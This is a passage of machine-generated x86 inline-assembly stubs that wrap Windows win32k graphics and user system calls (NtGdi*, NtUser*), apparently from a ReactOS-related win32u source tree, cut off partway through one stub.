__declspec(naked) ULONG NTAPI NtGdiXLATEOBJ_hGetColorTransform()
{
    __asm {
        mov eax, 0000126Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCLIPOBJ_bEnum()
{
    __asm {
        mov eax, 00001270h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCLIPOBJ_cEnumStart()
{
    __asm {
        mov eax, 00001271h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCLIPOBJ_ppoGetPath()
{
    __asm {
        mov eax, 00001272h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeletePath()
{
    __asm {
        mov eax, 00001273h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCreateClip()
{
    __asm {
        mov eax, 00001274h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngDeleteClip()
{
    __asm {
        mov eax, 00001275h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_ulGetBrushColor()
{
    __asm {
        mov eax, 00001276h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_pvAllocRbrush()
{
    __asm {
        mov eax, 00001277h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_pvGetRbrush()
{
    __asm {
        mov eax, 00001278h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_hGetColorTransform()
{
    __asm {
        mov eax, 00001279h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXFORMOBJ_bApplyXform()
{
    __asm {
        mov eax, 0000127Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiXFORMOBJ_iGetXform()
{
    __asm {
        mov eax, 0000127Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_vGetInfo()
{
    __asm {
        mov eax, 0000127Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pxoGetXform()
{
    __asm {
        mov eax, 0000127Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_cGetGlyphs()
{
    __asm {
        mov eax, 0000127Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pifi()
{
    __asm {
        mov eax, 0000127Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pfdg()
{
    __asm {
        mov eax, 00001280h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pQueryGlyphAttrs()
{
    __asm {
        mov eax, 00001281h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_pvTrueTypeFontFile()
{
    __asm {
        mov eax, 00001282h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFONTOBJ_cGetAllGlyphHandles()
{
    __asm {
        mov eax, 00001283h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_bEnum()
{
    __asm {
        mov eax, 00001284h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_bEnumPositionsOnly()
{
    __asm {
        mov eax, 00001285h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_bGetAdvanceWidths()
{
    __asm {
        mov eax, 00001286h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_vEnumStart()
{
    __asm {
        mov eax, 00001287h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSTROBJ_dwGetCodePage()
{
    __asm {
        mov eax, 00001288h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_vGetBounds()
{
    __asm {
        mov eax, 00001289h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_bEnum()
{
    __asm {
        mov eax, 0000128Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_vEnumStart()
{
    __asm {
        mov eax, 0000128Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_vEnumStartClipLines()
{
    __asm {
        mov eax, 0000128Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiPATHOBJ_bEnumClipLines()
{
    __asm {
        mov eax, 0000128Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetDhpdev()
{
    __asm {
        mov eax, 0000128Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiEngCheckAbort()
{
    __asm {
        mov eax, 0000128Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiHT_Get8BPPFormatPalette()
{
    __asm {
        mov eax, 00001290h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiHT_Get8BPPMaskPalette()
{
    __asm {
        mov eax, 00001291h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUpdateTransform()
{
    __asm {
        mov eax, 00001292h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetPUMPDOBJ()
{
    __asm {
        mov eax, 00001293h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBRUSHOBJ_DeleteRbrush()
{
    __asm {
        mov eax, 00001294h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiUMPDEngFreeUserMem()
{
    __asm {
        mov eax, 00001295h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDrawStream()
{
    __asm {
        mov eax, 00001296h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiMakeObjectXferable()
{
    __asm {
        mov eax, 00001297h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtDxEngGetRedirectionBitmap()
{
    __asm {
        mov eax, 00001298h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetViewportOrgEx()
{
    __asm {
        mov eax, 00001299h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiSetWindowOrgEx()
{
    __asm {
        mov eax, 0000129Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiGetFontFamilyInfo()
{
    __asm {
        mov eax, 0000129Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiOffsetViewportOrgEx()
{
    __asm {
        mov eax, 0000129Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiOffsetWindowOrgEx()
{
    __asm {
        mov eax, 0000129Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtUserGetMonitorInfo()
{
    __asm {
        mov eax, 0000129Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserMonitorFromPoint()
{
    __asm {
        mov eax, 0000129Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtUserMonitorFromRect()
{
    __asm {
        mov eax, 000012A0h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserMonitorFromWindow()
{
    __asm {
        mov eax, 000012A1h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtUserSetScrollBarInfo()
{
    __asm {
        mov eax, 000012A2h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDDICreateDCFromMemory()
{
    __asm {
        mov eax, 000012A3h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDDIDestroyDCFromMemory()
{
    __asm {
        mov eax, 000012A4h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}


```

`source/ROS/win32u/win32u/w32kcall_checked.h`:

```h
/* MACHINE GENERATED, DO NOT EDIT */
#define KUSER_SHARED_SYSCALL 7FFE0300h

__declspec(naked) ULONG NTAPI NtGdiAbortDoc()
{
    __asm {
        mov eax, 00001000h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAbortPath()
{
    __asm {
        mov eax, 00001001h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddFontResourceW()
{
    __asm {
        mov eax, 00001002h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddRemoteFontToDC()
{
    __asm {
        mov eax, 00001003h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddFontMemResourceEx()
{
    __asm {
        mov eax, 00001004h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiRemoveMergeFont()
{
    __asm {
        mov eax, 00001005h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAddRemoteMMInstanceToDC()
{
    __asm {
        mov eax, 00001006h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiAlphaBlend()
{
    __asm {
        mov eax, 00001007h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000030h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAngleArc()
{
    __asm {
        mov eax, 00001008h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiAnyLinkedFonts()
{
    __asm {
        mov eax, 00001009h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000000h
    }
}

__declspec(naked) ULONG NTAPI NtGdiFontIsLinked()
{
    __asm {
        mov eax, 0000100Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiArcInternal()
{
    __asm {
        mov eax, 0000100Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000028h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBeginPath()
{
    __asm {
        mov eax, 0000100Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiBitBlt()
{
    __asm {
        mov eax, 0000100Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCancelDC()
{
    __asm {
        mov eax, 0000100Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCheckBitmapBits()
{
    __asm {
        mov eax, 0000100Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCloseFigure()
{
    __asm {
        mov eax, 00001010h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiClearBitmapAttributes()
{
    __asm {
        mov eax, 00001011h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiClearBrushAttributes()
{
    __asm {
        mov eax, 00001012h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiColorCorrectPalette()
{
    __asm {
        mov eax, 00001013h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCombineRgn()
{
    __asm {
        mov eax, 00001014h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCombineTransform()
{
    __asm {
        mov eax, 00001015h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiComputeXformCoefficients()
{
    __asm {
        mov eax, 00001016h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiConsoleTextOut()
{
    __asm {
        mov eax, 00001017h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiConvertMetafileRect()
{
    __asm {
        mov eax, 00001018h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateBitmap()
{
    __asm {
        mov eax, 00001019h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateClientObj()
{
    __asm {
        mov eax, 0000101Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateColorSpace()
{
    __asm {
        mov eax, 0000101Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateColorTransform()
{
    __asm {
        mov eax, 0000101Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateCompatibleBitmap()
{
    __asm {
        mov eax, 0000101Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateCompatibleDC()
{
    __asm {
        mov eax, 0000101Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateDIBBrush()
{
    __asm {
        mov eax, 0000101Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateDIBitmapInternal()
{
    __asm {
        mov eax, 00001020h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateDIBSection()
{
    __asm {
        mov eax, 00001021h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000024h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateEllipticRgn()
{
    __asm {
        mov eax, 00001022h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateHalftonePalette()
{
    __asm {
        mov eax, 00001023h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateHatchBrushInternal()
{
    __asm {
        mov eax, 00001024h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateMetafileDC()
{
    __asm {
        mov eax, 00001025h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreatePaletteInternal()
{
    __asm {
        mov eax, 00001026h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreatePatternBrushInternal()
{
    __asm {
        mov eax, 00001027h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreatePen()
{
    __asm {
        mov eax, 00001028h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateRectRgn()
{
    __asm {
        mov eax, 00001029h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateRoundRectRgn()
{
    __asm {
        mov eax, 0000102Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateServerMetaFile()
{
    __asm {
        mov eax, 0000102Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiCreateSolidBrush()
{
    __asm {
        mov eax, 0000102Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dContextCreate()
{
    __asm {
        mov eax, 0000102Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000010h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dContextDestroy()
{
    __asm {
        mov eax, 0000102Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dContextDestroyAll()
{
    __asm {
        mov eax, 0000102Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dValidateTextureStageState()
{
    __asm {
        mov eax, 00001030h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiD3dDrawPrimitives2()
{
    __asm {
        mov eax, 00001031h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000001Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDriverState()
{
    __asm {
        mov eax, 00001032h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdAddAttachedSurface()
{
    __asm {
        mov eax, 00001033h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdAlphaBlt()
{
    __asm {
        mov eax, 00001034h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdAttachSurface()
{
    __asm {
        mov eax, 00001035h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdBeginMoCompFrame()
{
    __asm {
        mov eax, 00001036h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdBlt()
{
    __asm {
        mov eax, 00001037h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCanCreateSurface()
{
    __asm {
        mov eax, 00001038h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCanCreateD3DBuffer()
{
    __asm {
        mov eax, 00001039h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdColorControl()
{
    __asm {
        mov eax, 0000103Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateDirectDrawObject()
{
    __asm {
        mov eax, 0000103Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateSurface()
{
    __asm {
        mov eax, 0000103Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateD3DBuffer()
{
    __asm {
        mov eax, 0000103Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000020h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateMoComp()
{
    __asm {
        mov eax, 0000103Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdCreateSurfaceObject()
{
    __asm {
        mov eax, 0000103Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000018h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDeleteDirectDrawObject()
{
    __asm {
        mov eax, 00001040h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDeleteSurfaceObject()
{
    __asm {
        mov eax, 00001041h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDestroyMoComp()
{
    __asm {
        mov eax, 00001042h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDestroySurface()
{
    __asm {
        mov eax, 00001043h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdDestroyD3DBuffer()
{
    __asm {
        mov eax, 00001044h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000004h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdEndMoCompFrame()
{
    __asm {
        mov eax, 00001045h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdFlip()
{
    __asm {
        mov eax, 00001046h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000014h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdFlipToGDISurface()
{
    __asm {
        mov eax, 00001047h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetAvailDriverMemory()
{
    __asm {
        mov eax, 00001048h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetBltStatus()
{
    __asm {
        mov eax, 00001049h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDC()
{
    __asm {
        mov eax, 0000104Ah
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDriverInfo()
{
    __asm {
        mov eax, 0000104Bh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetDxHandle()
{
    __asm {
        mov eax, 0000104Ch
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetFlipStatus()
{
    __asm {
        mov eax, 0000104Dh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetInternalMoCompInfo()
{
    __asm {
        mov eax, 0000104Eh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetMoCompBuffInfo()
{
    __asm {
        mov eax, 0000104Fh
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetMoCompGuids()
{
    __asm {
        mov eax, 00001050h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetMoCompFormats()
{
    __asm {
        mov eax, 00001051h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdGetScanLine()
{
    __asm {
        mov eax, 00001052h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdLock()
{
    __asm {
        mov eax, 00001053h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000000Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdLockD3D()
{
    __asm {
        mov eax, 00001054h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdQueryDirectDrawObject()
{
    __asm {
        mov eax, 00001055h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 0000002Ch
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdQueryMoCompStatus()
{
    __asm {
        mov eax, 00001056h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdReenableDirectDrawObject()
{
    __asm {
        mov eax, 00001057h
        mov edx, KUSER_SHARED_SYSCALL
        call dword ptr [edx]
        retn 00000008h
    }
}

__declspec(naked) ULONG NTAPI NtGdiDdReleaseDC()
{
